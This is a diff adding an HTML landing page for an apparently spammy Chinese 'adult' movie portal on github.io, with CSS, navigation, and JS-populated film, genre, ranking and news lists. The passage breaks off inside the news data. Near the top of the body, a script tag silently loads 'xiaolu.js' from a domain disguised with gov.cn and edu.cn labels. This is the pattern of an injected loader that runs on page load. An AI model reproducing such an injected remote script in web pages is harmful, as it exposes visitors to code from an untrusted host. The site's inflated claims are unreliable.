@@ -1,0 +1,810 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="亚洲成人快播电影网 - 为您提供最新、最热门的亚洲电影资源，涵盖多种类型和地区的精选影视内容。">
+<meta name="keywords" content="亚洲成人快播电影网, 亚洲电影, 在线观影, 影视资源, yazhouchengrenkuaibodianyingwang">
+<meta name="robots" content="index, follow">
+<meta name="author" content="亚洲成人快播电影网">
+<meta property="og:title" content="亚洲成人快播电影网 - 精选亚洲影视资源平台">
+<meta property="og:description" content="为您提供最新、最热门的亚洲电影资源，涵盖多种类型和地区的精选影视内容。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://yazhouchengrenkuaibodianyingwang-wap.github.io">
+<title>亚洲成人快播电影网 - 精选亚洲影视资源平台 | yazhouchengrenkuaibodianyingwang-wap.github.io</title>
+<style>
+/* ========== CSS Reset & Variables ========== */
+*, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+:root {
+    --primary: #e50914;
+    --primary-dark: #b8070f;
+    --secondary: #0f172a;
+    --accent: #f59e0b;
+    --bg-dark: #0a0e1a;
+    --bg-card: #131a2e;
+    --bg-card-hover: #1a2340;
+    --text-primary: #f1f5f9;
+    --text-secondary: #94a3b8;
+    --text-muted: #64748b;
+    --border: #1e293b;
+    --gradient-1: linear-gradient(135deg, #e50914 0%, #f59e0b 100%);
+    --gradient-2: linear-gradient(180deg, rgba(10,14,26,0.95) 0%, rgba(15,23,42,0.98) 100%);
+    --shadow-glow: 0 0 30px rgba(229, 9, 20, 0.3);
+    --radius: 12px;
+    --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+}
+
+html { scroll-behavior: smooth; }
+
+body {
+    font-family: 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', sans-serif;
+    background: var(--bg-dark);
+    color: var(--text-primary);
+    line-height: 1.6;
+    overflow-x: hidden;
+}
+
+/* ========== Preloader ========== */
+.preloader {
+    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+    background: var(--bg-dark); z-index: 9999;
+    display: flex; align-items: center; justify-content: center;
+    transition: opacity 0.5s, visibility 0.5s;
+}
+.preloader.hidden { opacity: 0; visibility: hidden; }
+.preloader-spinner {
+    width: 50px; height: 50px;
+    border: 3px solid var(--border);
+    border-top-color: var(--primary);
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+
+/* ========== Navigation ========== */
+.navbar {
+    position: fixed; top: 0; left: 0; width: 100%;
+    z-index: 1000; padding: 15px 0;
+    background: rgba(10, 14, 26, 0.85);
+    backdrop-filter: blur(20px);
+    border-bottom: 1px solid rgba(255,255,255,0.05);
+    transition: var(--transition);
+}
+.navbar.scrolled { padding: 10px 0; background: rgba(10, 14, 26, 0.95); }
+.nav-container {
+    max-width: 1200px; margin: 0 auto; padding: 0 20px;
+    display: flex; align-items: center; justify-content: space-between;
+}
+.nav-logo {
+    font-size: 1.5rem; font-weight: 800; letter-spacing: 1px;
+    background: var(--gradient-1); -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+    text-decoration: none;
+}
+.nav-logo span { color: var(--primary); }
+.nav-menu { display: flex; gap: 30px; list-style: none; }
+.nav-menu a {
+    color: var(--text-secondary); text-decoration: none;
+    font-size: 0.95rem; font-weight: 500;
+    transition: var(--transition); position: relative;
+    padding: 5px 0;
+}
+.nav-menu a::after {
+    content: ''; position: absolute; bottom: 0; left: 0;
+    width: 0; height: 2px; background: var(--primary);
+    transition: var(--transition);
+}
+.nav-menu a:hover { color: var(--text-primary); }
+.nav-menu a:hover::after { width: 100%; }
+.nav-toggle {
+    display: none; flex-direction: column; gap: 5px;
+    cursor: pointer; padding: 5px;
+}
+.nav-toggle span {
+    width: 25px; height: 2px; background: var(--text-primary);
+    transition: var(--transition); border-radius: 2px;
+}
+
+/* ========== Hero Section ========== */
+.hero {
+    min-height: 100vh; display: flex; align-items: center;
+    position: relative; overflow: hidden;
+    background: radial-gradient(ellipse at 30% 50%, rgba(229,9,20,0.15) 0%, transparent 60%),
+                radial-gradient(ellipse at 70% 50%, rgba(245,158,11,0.08) 0%, transparent 60%),
+                var(--bg-dark);
+}
+.hero-container {
+    max-width: 1200px; margin: 0 auto; padding: 120px 20px 60px;
+    position: relative; z-index: 2; text-align: center;
+}
+.hero-badge {
+    display: inline-block; padding: 6px 18px;
+    background: rgba(229,9,20,0.15); border: 1px solid rgba(229,9,20,0.3);
+    border-radius: 30px; color: var(--primary);
+    font-size: 0.85rem; font-weight: 600; margin-bottom: 20px;
+    letter-spacing: 1px;
+}
+.hero-title {
+    font-size: clamp(2.5rem, 6vw, 4.5rem);
+    font-weight: 900; line-height: 1.1; margin-bottom: 20px;
+    background: linear-gradient(135deg, #fff 0%, #94a3b8 100%);
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+}
+.hero-title .highlight { color: var(--primary); -webkit-text-fill-color: var(--primary); }
+.hero-subtitle {
+    font-size: clamp(1rem, 2.5vw, 1.25rem);
+    color: var(--text-secondary); max-width: 600px;
+    margin: 0 auto 35px;
+}
+.hero-stats {
+    display: flex; gap: 50px; justify-content: center; flex-wrap: wrap;
+    margin-bottom: 40px;
+}
+.hero-stat { text-align: center; }
+.hero-stat-number {
+    font-size: 2.5rem; font-weight: 800; color: var(--primary);
+}
+.hero-stat-label { font-size: 0.85rem; color: var(--text-muted); margin-top: 2px; }
+.hero-btn {
+    display: inline-flex; align-items: center; gap: 8px;
+    padding: 14px 36px; background: var(--gradient-1);
+    color: #fff; text-decoration: none; border-radius: 50px;
+    font-weight: 600; font-size: 1rem;
+    transition: var(--transition);
+    box-shadow: 0 4px 20px rgba(229,9,20,0.3);
+}
+.hero-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(229,9,20,0.5); }
+.hero-btn-outline {
+    display: inline-flex; align-items: center; gap: 8px;
+    padding: 14px 36px; background: transparent;
+    color: var(--text-primary); text-decoration: none;
+    border: 2px solid var(--border); border-radius: 50px;
+    font-weight: 600; font-size: 1rem; margin-left: 12px;
+    transition: var(--transition);
+}
+.hero-btn-outline:hover { border-color: var(--primary); color: var(--primary); }
+
+/* ========== Section Common ========== */
+.section { padding: 80px 0; position: relative; }
+.section-container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
+.section-header { text-align: center; margin-bottom: 50px; }
+.section-badge {
+    display: inline-block; padding: 4px 14px;
+    background: rgba(245,158,11,0.12); border: 1px solid rgba(245,158,11,0.25);
+    border-radius: 20px; color: var(--accent);
+    font-size: 0.8rem; font-weight: 600; margin-bottom: 12px;
+}
+.section-title {
+    font-size: clamp(1.8rem, 4vw, 2.8rem);
+    font-weight: 800; margin-bottom: 12px;
+}
+.section-desc { color: var(--text-secondary); font-size: 1rem; max-width: 500px; margin: 0 auto; }
+
+/* ========== Movie Grid ========== */
+.movie-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+    gap: 20px;
+}
+.movie-card {
+    background: var(--bg-card); border-radius: var(--radius);
+    overflow: hidden; transition: var(--transition);
+    border: 1px solid var(--border); cursor: pointer;
+}
+.movie-card:hover { transform: translateY(-5px); border-color: var(--primary); box-shadow: var(--shadow-glow); }
+.movie-poster {
+    width: 100%; aspect-ratio: 2/3; position: relative; overflow: hidden;
+    background: linear-gradient(135deg, #1e293b, #0f172a);
+    display: flex; align-items: center; justify-content: center;
+}
+.movie-poster-emoji { font-size: 3rem; opacity: 0.5; }
+.movie-rating {
+    position: absolute; top: 10px; right: 10px;
+    background: rgba(0,0,0,0.7); backdrop-filter: blur(4px);
+    padding: 3px 8px; border-radius: 4px; font-size: 0.75rem; font-weight: 700;
+    color: var(--accent);
+}
+.movie-info { padding: 14px; }
+.movie-title { font-size: 0.95rem; font-weight: 600; margin-bottom: 4px; }
+.movie-meta { font-size: 0.78rem; color: var(--text-muted); display: flex; gap: 8px; }
+
+/* ========== Genre Section ========== */
+.genre-section { background: var(--gradient-2); }
+.genre-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+    gap: 16px;
+}
+.genre-card {
+    background: var(--bg-card); border: 1px solid var(--border);
+    border-radius: var(--radius); padding: 30px 20px; text-align: center;
+    transition: var(--transition); text-decoration: none;
+    display: block;
+}
+.genre-card:hover { background: var(--bg-card-hover); border-color: var(--accent); transform: translateY(-3px); }
+.genre-icon { font-size: 2.5rem; margin-bottom: 12px; display: block; }
+.genre-name { font-size: 1rem; font-weight: 600; color: var(--text-primary); }
+.genre-count { font-size: 0.78rem; color: var(--text-muted); margin-top: 4px; }
+
+/* ========== News Section ========== */
+.news-list { display: flex; flex-direction: column; gap: 16px; }
+.news-item {
+    display: flex; gap: 16px; padding: 20px;
+    background: var(--bg-card); border: 1px solid var(--border);
+    border-radius: var(--radius); transition: var(--transition);
+    text-decoration: none; align-items: flex-start;
+}
+.news-item:hover { border-color: var(--primary); background: var(--bg-card-hover); }
+.news-date {
+    min-width: 55px; text-align: center; padding: 8px;
+    background: rgba(229,9,20,0.1); border-radius: 8px;
+}
+.news-date-day { font-size: 1.4rem; font-weight: 800; color: var(--primary); line-height: 1; }
+.news-date-month { font-size: 0.7rem; color: var(--text-muted); margin-top: 2px; }
+.news-content { flex: 1; }
+.news-title { font-size: 1rem; font-weight: 600; color: var(--text-primary); margin-bottom: 4px; }
+.news-excerpt { font-size: 0.85rem; color: var(--text-secondary); line-height: 1.5; }
+.news-tag {
+    display: inline-block; padding: 2px 8px; margin-top: 6px;
+    background: rgba(245,158,11,0.12); color: var(--accent);
+    border-radius: 4px; font-size: 0.7rem; font-weight: 600;
+}
+
+/* ========== Ranking Section ========== */
+.rank-section { background: var(--gradient-2); }
+.rank-list { display: flex; flex-direction: column; gap: 12px; }
+.rank-item {
+    display: flex; align-items: center; gap: 16px;
+    padding: 16px 20px; background: var(--bg-card);
+    border: 1px solid var(--border); border-radius: var(--radius);
+    transition: var(--transition); cursor: pointer;
+}
+.rank-item:hover { border-color: var(--primary); transform: translateX(5px); }
+.rank-number {
+    font-size: 1.8rem; font-weight: 900; min-width: 40px;
+    color: var(--text-muted);
+}
+.rank-item:nth-child(1) .rank-number { color: #ffd700; }
+.rank-item:nth-child(2) .rank-number { color: #c0c0c0; }
+.rank-item:nth-child(3) .rank-number { color: #cd7f32; }
+.rank-thumb {
+    width: 50px; height: 70px; border-radius: 6px;
+    background: linear-gradient(135deg, #1e293b, #0f172a);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 1.5rem; opacity: 0.6;
+}
+.rank-info { flex: 1; }
+.rank-title { font-size: 0.95rem; font-weight: 600; margin-bottom: 2px; }
+.rank-views { font-size: 0.78rem; color: var(--text-muted); }
+.rank-score {
+    font-size: 1.1rem; font-weight: 700; color: var(--accent);
+    min-width: 45px; text-align: right;
+}
+
+/* ========== About Section ========== */
+.about-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 50px; align-items: center;
+}
+.about-text h3 { font-size: 1.8rem; font-weight: 800; margin-bottom: 20px; }
+.about-text p { color: var(--text-secondary); margin-bottom: 16px; font-size: 0.95rem; }
+.about-features { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-top: 24px; }
+.about-feature {
+    background: var(--bg-card); border: 1px solid var(--border);
+    border-radius: var(--radius); padding: 20px; text-align: center;
+    transition: var(--transition);
+}
+.about-feature:hover { border-color: var(--primary); }
+.about-feature-icon { font-size: 2rem; margin-bottom: 8px; }
+.about-feature-title { font-size: 0.9rem; font-weight: 600; }
+.about-visual {
+    position: relative; height: 400px;
+    background: var(--bg-card); border-radius: 20px;
+    border: 1px solid var(--border); overflow: hidden;
+    display: flex; align-items: center; justify-content: center;
+}
+.about-visual::before {
+    content: ''; position: absolute; inset: -50%;
+    background: conic-gradient(from 0deg, transparent, rgba(229,9,20,0.1), transparent 60%);
+    animation: rotate 8s linear infinite;
+}
+@keyframes rotate { to { transform: rotate(360deg); } }
+.about-visual-content {
+    position: relative; z-index: 2; text-align: center; padding: 40px;
+}
+.about-visual-icon { font-size: 4rem; margin-bottom: 16px; }
+.about-visual-title { font-size: 1.5rem; font-weight: 800; margin-bottom: 8px; }
+.about-visual-sub { color: var(--text-secondary); font-size: 0.9rem; }
+
+/* ========== Footer ========== */
+.footer {
+    background: var(--secondary); border-top: 1px solid var(--border);
+    padding: 50px 0 20px;
+}
+.footer-container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
+.footer-top {
+    display: grid; grid-template-columns: 2fr 1fr 1fr 1fr;
+    gap: 40px; margin-bottom: 40px;
+}
+.footer-brand-title {
+    font-size: 1.5rem; font-weight: 800;
+    background: var(--gradient-1); -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+    margin-bottom: 12px;
+}
+.footer-brand-desc { color: var(--text-muted); font-size: 0.85rem; max-width: 280px; }
+.footer-col-title { font-size: 1rem; font-weight: 700; margin-bottom: 16px; }
+.footer-col ul { list-style: none; display: flex; flex-direction: column; gap: 8px; }
+.footer-col a {
+    color: var(--text-muted); text-decoration: none; font-size: 0.85rem;
+    transition: var(--transition);
+}
+.footer-col a:hover { color: var(--primary); }
+.footer-bottom {
+    border-top: 1px solid var(--border); padding-top: 20px;
+    text-align: center; color: var(--text-muted); font-size: 0.8rem;
+}
+.footer-bottom a { color: var(--text-muted); text-decoration: none; }
+.footer-bottom a:hover { color: var(--primary); }
+
+/* ========== Back to Top ========== */
+.back-to-top {
+    position: fixed; bottom: 30px; right: 30px;
+    width: 45px; height: 45px; border-radius: 50%;
+    background: var(--primary); color: #fff;
+    display: flex; align-items: center; justify-content: center;
+    text-decoration: none; font-size: 1.2rem; z-index: 999;
+    opacity: 0; visibility: hidden; transition: var(--transition);
+    box-shadow: 0 4px 15px rgba(229,9,20,0.4);
+}
+.back-to-top.visible { opacity: 1; visibility: visible; }
+.back-to-top:hover { background: var(--primary-dark); transform: translateY(-2px); }
+
+/* ========== Responsive ========== */
+@media (max-width: 768px) {
+    .nav-menu {
+        position: fixed; top: 0; right: -100%;
+        width: 70%; height: 100vh;
+        background: var(--bg-card);
+        flex-direction: column; align-items: center; justify-content: center;
+        transition: right 0.4s ease;
+        border-left: 1px solid var(--border);
+    }
+    .nav-menu.active { right: 0; }
+    .nav-toggle { display: flex; }
+    .nav-toggle.active span:nth-child(1) { transform: rotate(45deg) translate(5px, 5px); }
+    .nav-toggle.active span:nth-child(2) { opacity: 0; }
+    .nav-toggle.active span:nth-child(3) { transform: rotate(-45deg) translate(5px, -5px); }
+
+    .hero { min-height: 90vh; }
+    .hero-stats { gap: 25px; }
+    .hero-stat-number { font-size: 1.8rem; }
+    .hero-btn-outline { margin-left: 0; margin-top: 12px; }
+
+    .section { padding: 60px 0; }
+
+    .about-grid { grid-template-columns: 1fr; gap: 30px; }
+    .about-visual { height: 300px; }
+    .about-features { grid-template-columns: 1fr; }
+
+    .footer-top { grid-template-columns: 1fr 1fr; gap: 25px; }
+    .footer-brand { grid-column: 1 / -1; }
+
+    .news-item { flex-direction: column; gap: 10px; }
+    .news-date { display: flex; align-items: center; gap: 6px; padding: 4px 10px; }
+    .news-date-day { font-size: 1rem; }
+    .news-date-month { margin-top: 0; }
+
+    .movie-grid { grid-template-columns: repeat(2, 1fr); gap: 12px; }
+    .genre-grid { grid-template-columns: repeat(2, 1fr); gap: 10px; }
+
+    .rank-item { padding: 12px 14px; gap: 10px; }
+    .rank-number { font-size: 1.3rem; min-width: 30px; }
+    .rank-thumb { width: 40px; height: 56px; }
+}
+
+@media (max-width: 480px) {
+    .hero-container { padding: 100px 16px 40px; }
+    .movie-grid { grid-template-columns: repeat(2, 1fr); }
+    .footer-top { grid-template-columns: 1fr; }
+    .section-container { padding: 0 16px; }
+}
+
+/* ========== Animations ========== */
+.fade-in { opacity: 0; transform: translateY(30px); transition: opacity 0.6s ease, transform 0.6s ease; }
+.fade-in.visible { opacity: 1; transform: translateY(0); }
+
+@keyframes float {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-10px); }
+}
+.floating { animation: float 3s ease-in-out infinite; }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<!-- Preloader -->
+<div class="preloader" id="preloader">
+    <div class="preloader-spinner"></div>
+</div>
+
+<!-- Navigation -->
+<nav class="navbar" id="navbar">
+    <div class="nav-container">
+        <a href="#" class="nav-logo">🎬 亚洲<span>电影网</span></a>
+        <ul class="nav-menu" id="navMenu">
+            <li><a href="#home">首页</a></li>
+            <li><a href="#movies">电影库</a></li>
+            <li><a href="#genre">分类</a></li>
+            <li><a href="#ranking">排行榜</a></li>
+            <li><a href="#news">影视资讯</a></li>
+            <li><a href="#about">关于我们</a></li>
+        </ul>
+        <div class="nav-toggle" id="navToggle">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+    </div>
+</nav>
+
+<!-- Hero Section -->
+<section class="hero" id="home">
+    <div class="hero-container">
+        <div class="hero-badge">🎥 精选亚洲影视 · 每日更新</div>
+        <h1 class="hero-title">发现好电影<br><span class="highlight">从这里开始</span></h1>
+        <p class="hero-subtitle">汇聚亚洲各地区最新、最热、最经典的影视资源，提供高清流畅的在线观影体验</p>
+        <div class="hero-stats">
+            <div class="hero-stat">
+                <div class="hero-stat-number">10,000+</div>
+                <div class="hero-stat-label">精选影片</div>
+            </div>
+            <div class="hero-stat">
+                <div class="hero-stat-number">50+</div>
+                <div class="hero-stat-label">国家地区</div>
+            </div>
+            <div class="hero-stat">
+                <div class="hero-stat-number">100万+</div>
+                <div class="hero-stat-label">忠实用户</div>
+            </div>
+        </div>
+        <div>
+            <a href="#movies" class="hero-btn">🎬 立即观影</a>
+            <a href="#about" class="hero-btn-outline">了解更多</a>
+        </div>
+    </div>
+</section>
+
+<!-- Movie Library Section -->
+<section class="section" id="movies">
+    <div class="section-container">
+        <div class="section-header fade-in">
+            <div class="section-badge">HOT 热门推荐</div>
+            <h2 class="section-title">精选电影库</h2>
+            <p class="section-desc">精心挑选的优质影片，涵盖多种类型和地区</p>
+        </div>
+        <div class="movie-grid" id="movieGrid">
+            <!-- Movies will be populated by JS -->
+        </div>
+    </div>
+</section>
+
+<!-- Genre Section -->
+<section class="section genre-section" id="genre">
+    <div class="section-container">
+        <div class="section-header fade-in">
+            <div class="section-badge">CATEGORY 类型导航</div>
+            <h2 class="section-title">按类型浏览</h2>
+            <p class="section-desc">找到你喜欢的电影类型，探索更多精彩内容</p>
+        </div>
+        <div class="genre-grid" id="genreGrid">
+            <!-- Genres will be populated by JS -->
+        </div>
+    </div>
+</section>
+
+<!-- Ranking Section -->
+<section class="section rank-section" id="ranking">
+    <div class="section-container">
+        <div class="section-header fade-in">
+            <div class="section-badge">TOP 榜单</div>
+            <h2 class="section-title">热门排行榜</h2>
+            <p class="section-desc">本周最受欢迎的影视作品，看看大家都在看什么</p>
+        </div>
+        <div class="rank-list" id="rankList">
+            <!-- Rankings will be populated by JS -->
+        </div>
+    </div>
+</section>
+
+<!-- News Section -->
+<section class="section" id="news">
+    <div class="section-container">
+        <div class="section-header fade-in">
+            <div class="section-badge">NEWS 影视动态</div>
+            <h2 class="section-title">最新资讯</h2>
+            <p class="section-desc">掌握影视圈最新动态，不错过任何精彩内容</p>
+        </div>
+        <div class="news-list" id="newsList">
+            <!-- News will be populated by JS -->
+        </div>
+    </div>
+</section>
+
+<!-- About Section -->
+<section class="section genre-section" id="about">
+    <div class="section-container">
+        <div class="about-grid">
+            <div class="about-text fade-in">
+                <h3>关于 亚洲成人快播电影网</h3>
+                <p>亚洲成人快播电影网（yazhouchengrenkuaibodianyingwang-wap.github.io）致力于为影视爱好者提供最全面、最优质的亚洲影视资源。</p>
+                <p>我们涵盖中国、日本、韩国、泰国、印度等多个亚洲国家的电影和电视剧，每日更新最新内容，让您随时随地享受观影乐趣。</p>
+                <div class="about-features">
+                    <div class="about-feature">
+                        <div class="about-feature-icon">🎯</div>
+                        <div class="about-feature-title">精准推荐</div>
+                    </div>
+                    <div class="about-feature">
+                        <div class="about-feature-icon">⚡</div>
+                        <div class="about-feature-title">极速加载</div>
+                    </div>
+                    <div class="about-feature">
+                        <div class="about-feature-icon">📱</div>
+                        <div class="about-feature-title">多端适配</div>
+                    </div>
+                    <div class="about-feature">
+                        <div class="about-feature-icon">🔄</div>
+                        <div class="about-feature-title">每日更新</div>
+                    </div>
+                </div>
+            </div>
+            <div class="about-visual fade-in">
+                <div class="about-visual-content">
+                    <div class="about-visual-icon">🎬</div>
+                    <div class="about-visual-title">亚洲成人快播电影网</div>
+                    <div class="about-visual-sub">您的专属影视指南</div>
+                    <div style="margin-top:20px; display:flex; gap:10px; justify-content:center; flex-wrap:wrap;">
+                        <span style="padding:4px 12px; background:rgba(229,9,20,0.15); border:1px solid rgba(229,9,20,0.3); border-radius:20px; font-size:0.8rem; color:var(--primary);">#亚洲电影</span>
+                        <span style="padding:4px 12px; background:rgba(245,158,11,0.12); border:1px solid rgba(245,158,11,0.25); border-radius:20px; font-size:0.8rem; color:var(--accent);">#在线观影</span>
+                        <span style="padding:4px 12px; background:rgba(255,255,255,0.05); border:1px solid var(--border); border-radius:20px; font-size:0.8rem; color:var(--text-secondary);">#影视资源</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- Footer -->
+<footer class="footer">
+    <div class="footer-container">
+        <div class="footer-top">
+            <div class="footer-brand">
+                <div class="footer-brand-title">🎬 亚洲成人快播电影网</div>
+                <p class="footer-brand-desc">为您提供最新、最热、最全面的亚洲影视资源，涵盖多种类型和地区，每日精选更新。</p>
+            </div>
+            <div class="footer-col">
+                <h4 class="footer-col-title">快速导航</h4>
+                <ul>
+                    <li><a href="#home">首页</a></li>
+                    <li><a href="#movies">电影库</a></li>
+                    <li><a href="#genre">分类浏览</a></li>
+                    <li><a href="#ranking">排行榜</a></li>
+                </ul>
+            </div>
+            <div class="footer-col">
+                <h4 class="footer-col-title">资源分类</h4>
+                <ul>
+                    <li><a href="#">华语电影</a></li>
+                    <li><a href="#">日韩影视</a></li>
+                    <li><a href="#">东南亚电影</a></li>
+                    <li><a href="#">印度宝莱坞</a></li>
+                </ul>
+            </div>
+            <div class="footer-col">
+                <h4 class="footer-col-title">关于我们</h4>
+                <ul>
+                    <li><a href="#about">网站介绍</a></li>
+                    <li><a href="#">联系方式</a></li>
+                    <li><a href="#">免责声明</a></li>
+                    <li><a href="#">隐私政策</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>© 2024-2026 亚洲成人快播电影网 (yazhouchengrenkuaibodianyingwang-wap.github.io) 版权所有</p>
+            <p style="margin-top:8px;">本站仅提供影视信息聚合服务，资源版权归原权利人所有</p>
+        </div>
+    </div>
+</footer>
+
+<!-- Back to Top -->
+<a href="#" class="back-to-top" id="backToTop">↑</a>
+
+<script>
+// ========== Preloader ==========
+window.addEventListener('load', function() {
+    setTimeout(function() {
+        document.getElementById('preloader').classList.add('hidden');
+    }, 500);
+});
+
+// ========== Navigation Toggle (Mobile) ==========
+var navToggle = document.getElementById('navToggle');
+var navMenu = document.getElementById('navMenu');
+navToggle.addEventListener('click', function() {
+    navToggle.classList.toggle('active');
+    navMenu.classList.toggle('active');
+});
+
+// Close mobile menu on link click
+var navLinks = navMenu.querySelectorAll('a');
+navLinks.forEach(function(link) {
+    link.addEventListener('click', function() {
+        navToggle.classList.remove('active');
+        navMenu.classList.remove('active');
+    });
+});
+
+// ========== Navbar Scroll Effect ==========
+var navbar = document.getElementById('navbar');
+window.addEventListener('scroll', function() {
+    if (window.scrollY > 50) {
+        navbar.classList.add('scrolled');
+    } else {
+        navbar.classList.remove('scrolled');
+    }
+});
+
+// ========== Back to Top ==========
+var backToTop = document.getElementById('backToTop');
+window.addEventListener('scroll', function() {
+    if (window.scrollY > 300) {
+        backToTop.classList.add('visible');
+    } else {
+        backToTop.classList.remove('visible');
+    }
+});
+
+// ========== Fade In Animation ==========
+var observerOptions = { threshold: 0.1, rootMargin: '0px 0px -50px 0px' };
+var observer = new IntersectionObserver(function(entries) {
+    entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+            entry.target.classList.add('visible');
+        }
+    });
+}, observerOptions);
+document.querySelectorAll('.fade-in').forEach(function(el) {
+    observer.observe(el);
+});
+
+// ========== Movie Data ==========
+var movies = [
+    { title: '霸王别姬', emoji: '🎭', rating: '9.6', meta: '1993 · 剧情/爱情', tag: '华语经典' },
+    { title: '千与千寻', emoji: '🐉', rating: '9.4', meta: '2001 · 动画/奇幻', tag: '日本动画' },
+    { title: '寄生虫', emoji: '🏠', rating: '9.3', meta: '2019 · 剧情/惊悚', tag: '韩国电影' },
+    { title: '你的名字', emoji: '⭐', rating: '9.2', meta: '2016 · 动画/爱情', tag: '日本动画' },
+    { title: '卧虎藏龙', emoji: '🗡️', rating: '9.1', meta: '2000 · 动作/武侠', tag: '华语经典' },
+    { title: '燃烧', emoji: '🔥', rating: '8.9', meta: '2018 · 剧情/悬疑', tag: '韩国电影' },
+    { title: '七武士', emoji: '⚔️', rating: '9.3', meta: '1954 · 动作/冒险', tag: '日本电影' },
+    { title: '花样年华', emoji: '🌸', rating: '8.9', meta: '2000 · 剧情/爱情', tag: '华语经典' },
+    { title: '釜山行', emoji: '🧟', rating: '8.8', meta: '2016 · 动作/惊悚', tag: '韩国电影' },
+    { title: '罗生门', emoji: '🎪', rating: '9.2', meta: '1950 · 剧情/悬疑', tag: '日本电影' },
+    { title: '英雄本色', emoji: '🎯', rating: '8.7', meta: '1986 · 动作/犯罪', tag: '华语经典' },
+    { title: '杀人回忆', emoji: '🔍', rating: '9.1', meta: '2003 · 犯罪/悬疑', tag: '韩国电影' }
+];
+
+var movieGrid = document.getElementById('movieGrid');
+movies.forEach(function(movie, index) {
+    var delay = (index % 4) * 0.1;
+    var card = document.createElement('div');
+    card.className = 'movie-card fade-in';
+    card.style.transitionDelay = delay + 's';
+    card.innerHTML =
+        '<div class="movie-poster">' +
+            '<span class="movie-poster-emoji">' + movie.emoji + '</span>' +
+            '<span class="movie-rating">★ ' + movie.rating + '</span>' +
+        '</div>' +
+        '<div class="movie-info">' +
+            '<div class="movie-title">' + movie.title + '</div>' +
+            '<div class="movie-meta"><span>' + movie.meta + '</span></div>' +
+            '<span class="news-tag" style="margin-top:8px;">' + movie.tag + '</span>' +
+        '</div>';
+    movieGrid.appendChild(card);
+});
+
+// ========== Genre Data ==========
+var genres = [
+    { name: '动作', emoji: '💥', count: '1,200+' },
+    { name: '爱情', emoji: '💕', count: '980+' },
+    { name: '喜剧', emoji: '😂', count: '850+' },
+    { name: '恐怖', emoji: '👻', count: '420+' },
+    { name: '科幻', emoji: '🚀', count: '560+' },
+    { name: '悬疑', emoji: '🔎', count: '730+' },
+    { name: '动画', emoji: '🎨', count: '640+' },
+    { name: '纪录片', emoji: '📽️', count: '380+' },
+    { name: '战争', emoji: '⚔️', count: '290+' },
+    { name: '音乐', emoji: '🎵', count: '340+' },
+    { name: '奇幻', emoji: '🦄', count: '510+' },
+    { name: '犯罪', emoji: '🕵️', count: '670+' }
+];
+
+var genreGrid = document.getElementById('genreGrid');
+genres.forEach(function(genre, index) {
+    var card = document.createElement('a');
+    card.href = '#';
+    card.className = 'genre-card fade-in';
+    card.style.transitionDelay = (index * 0.03) + 's';
+    card.innerHTML =
+        '<span class="genre-icon">' + genre.emoji + '</span>' +
+        '<div class="genre-name">' + genre.name + '</div>' +
+        '<div class="genre-count">' + genre.count + ' 部影片</div>';
+    genreGrid.appendChild(card);
+});
+
+// ========== Ranking Data ==========
+var rankings = [
+    { title: '奥本海默', views: '2,450万次播放', score: '9.1', emoji: '💣' },
+    { title: '周处除三害', views: '1,890万次播放', score: '8.9', emoji: '⚡' },
+    { title: '热辣滚烫', views: '1,650万次播放', score: '8.7', emoji: '🥊' },
+    { title: '哥斯拉大战金刚2', views: '1,420万次播放', score: '8.5', emoji: '🦖' },
+    { title: '你想活出怎样的人生', views: '1,280万次播放', score: '8.8', emoji: '🌈' },
+    { title: '飞驰人生2', views: '1,150万次播放', score: '8.4', emoji: '🏎️' },
+    { title: '间谍过家家', views: '980万次播放', score: '8.6', emoji: '🕶️' },
+    { title: '默杀', views: '860万次播放', score: '8.3', emoji: '🤐' }
+];
+
+var rankList = document.getElementById('rankList');
+rankings.forEach(function(item, index) {
+    var rankItem = document.createElement('div');
+    rankItem.className = 'rank-item fade-in';
+    rankItem.innerHTML =
+        '<span class="rank-number">' + (index + 1) + '</span>' +
+        '<div class="rank-thumb">' + item.emoji + '</div>' +
+        '<div class="rank-info">' +
+            '<div class="rank-title">' + item.title + '</div>' +
+            '<div class="rank-views">' + item.views + '</div>' +
+        '</div>' +
+        '<span class="rank-score">' + item.score + '</span>';
+    rankList.appendChild(rankItem);
+});
+
+// ========== News Data ==========
+var news = [
+    { day: '09', month: '10月', title: '2024亚洲电影市场报告：流媒体与院线的融合趋势', excerpt: '随着数字化进程的加速，亚洲电影市场正经历前所未有的变革，流媒体平台与传统院线的边界日益模糊...', tag: '行业观察', emoji: '📊' },
+    { day: '08', month: '10月', title: '日本动画电影在全球市场的持续影响力分析', excerpt: '从宫崎骏到新海诚，日本动画电影凭借独特的叙事风格和视觉美学，持续在全球市场获得巨大成功...', tag: '深度分析', emoji: '🎌' },
+    { day: '07', month: '10月', title: '韩国电影在各大国际电影节斩获多项大奖', excerpt: '继《寄生虫》之后，韩国电影人继续在国际舞台上发光发热，多部作品获得重要奖项认可...', tag: '电影节', emoji: '🏆' },
